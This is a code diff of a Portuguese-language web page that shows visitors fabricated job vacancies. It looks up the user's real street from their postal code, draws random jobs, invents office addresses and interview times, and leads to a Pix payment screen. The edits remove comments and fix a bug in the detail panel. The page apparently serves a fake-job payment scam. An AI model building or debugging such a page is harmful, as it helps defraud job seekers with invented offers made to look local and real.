@@ -96,10 +96,8 @@
             border-radius: 8px; text-align: center; cursor: pointer; font-weight: 600; color: var(--primary);
         }
         .radio-horarios input:checked + label, .radio-horarios label:hover { border-color: var(--primary); background: var(--highlight); }
-        .radio-horarios input { display: none; } /* Esconde a bolinha do radio, deixa só a caixa clicável */
-        .radio-horarios input:checked + span { color: red; } /* truque css substituido pelo JS abaixo */
+        .radio-horarios input { display: none; } 
 
-        /* Estilo para label selecionada (gerenciado via JS ou CSS) */
         .horario-label.selecionado { border-color: var(--primary); background: var(--highlight); }
 
         .pix-box { text-align: center; padding: 20px; border: 2px dashed var(--success); border-radius: 8px; margin-top: 20px; }
@@ -184,7 +182,7 @@
 </div>
 
 <script>
-    // Banco de profissões (Totalmente diferentes entre si)
+    // Banco de profissões
     const profissoes = [
         { 
             titulo: "Vendedor(a) de Loja", 
@@ -223,7 +221,6 @@
         }
     ];
 
-    // Diferentes pares de dias e horários para garantir que nenhuma vaga concorra com a outra
     const pacotesDeHorarios = [
         [{ dia: "Próxima Segunda", hora: "09:00" }, { dia: "Próxima Quarta", hora: "14:30" }],
         [{ dia: "Próxima Terça", hora: "10:00" }, { dia: "Próxima Quinta", hora: "15:00" }],
@@ -233,7 +230,7 @@
     ];
 
     const nomesEdificios = ["Edifício Empresarial", "Centro Comercial", "Galeria Central"];
-    let vagasAtivas = []; // Vai guardar as 3 vagas sorteadas para o usuário
+    let vagasAtivas = [];
 
     async function buscarVagas() {
         const cepInput = document.getElementById('cep').value.replace(/\D/g, '');
@@ -248,7 +245,6 @@
             const bairroReal = data.bairro || "Centro";
             const cidade = data.localidade;
 
-            // Embaralha e seleciona 3 profissões diferentes e 3 pacotes de horários diferentes
             const profsSorteadas = profissoes.sort(() => 0.5 - Math.random()).slice(0, 3);
             const horariosSorteados = pacotesDeHorarios.sort(() => 0.5 - Math.random()).slice(0, 3);
 
@@ -256,18 +252,15 @@
             let vagasHtml = '';
 
             profsSorteadas.forEach((vaga, index) => {
-                // Monta endereço realista
                 const predio = nomesEdificios[Math.floor(Math.random() * nomesEdificios.length)];
                 const endereco = `${ruaReal}, ${Math.floor(Math.random() * 500) + 10} - ${predio}, Sala ${Math.floor(Math.random() * 90) + 10} - ${bairroReal}, ${cidade}`;
                 
-                // Salva a vaga final na memória do JS
                 vagasAtivas.push({
                     ...vaga,
                     endereco: endereco,
-                    horarios: horariosSorteados[index] // Horários exclusivos dessa vaga
+                    horarios: horariosSorteados[index]
                 });
 
-                // Cria o Card Resumido para exibição
                 vagasHtml += `
                     <div class="vaga-card" id="card-${index}" onclick="selecionarVaga(${index})">
                         <div class="vaga-resumo">
@@ -294,7 +287,6 @@
         vagaEscolhidaIndex = index;
         const vaga = vagasAtivas[index];
 
-        // Marca o card clicado e desmarca os outros
         document.querySelectorAll('.vaga-card').forEach(card => {
             card.classList.remove('selecionada');
             card.querySelector('.selecionar-btn').innerText = "Ver Vaga";
@@ -303,18 +295,15 @@
         cardAtivo.classList.add('selecionada');
         cardAtivo.querySelector('.selecionar-btn').innerText = "Selecionada";
 
-        // Preenche os dados detalhados na caixa oculta
         document.getElementById('detalhe-titulo').innerText = vaga.titulo;
         document.getElementById('detalhe-endereco').innerText = vaga.endereco;
         document.getElementById('detalhe-desc').innerText = vaga.desc;
         document.getElementById('detalhe-beneficios').innerText = vaga.beneficios;
         
-        // Preenche a lista de exigências
         let exigenciasHtml = "";
         vaga.exigencias.forEach(ex => { exigenciasHtml += `<li>${ex}</li>`; });
         document.getElementById('detalhe-exigencias').innerHTML = exigenciasHtml;
 
-        // Cria os botões de rádio com os horários exclusivos da vaga
         const htmlHorarios = vaga.horarios.map((h, i) => `
             <label class="horario-label" onclick="marcarHorario(this)">
                 <input type="radio" name="horario_escolhido" value="${h.dia} às ${h.hora}">
@@ -323,14 +312,11 @@
         `).join('');
         document.getElementById('opcoes-horarios').innerHTML = htmlHorarios;
 
-        // Exibe a área de detalhes
-        document.getElementById('detalhe-selecao').style.display = 'block';
-        
-        // Faz a página rolar suavemente para os detalhes
-        document.getElementById('detalhe-selecao').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        // AQUI ESTAVA O ERRO (Corrigido para detalhes-selecao com S)
+        document.getElementById('detalhes-selecao').style.display = 'block';
+        document.getElementById('detalhes-selecao').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     }
 
-    // Função visual para o botão de horário
     function marcarHorario(elementoLabel) {
         document.querySelectorAll('.horario-label').forEach(lbl => lbl.classList.remove('selecionado'));
         elementoLabel.classList.add('selecionado');
@@ -350,7 +336,6 @@
 
         const vaga = vagasAtivas[vagaEscolhidaIndex];
 
-        // Preenche os dados na tela do Pix
         document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
         document.getElementById('vaga-confirmacao').innerText = vaga.titulo;
         document.getElementById('horario-confirmacao').innerText = horarioEscolhido.value;
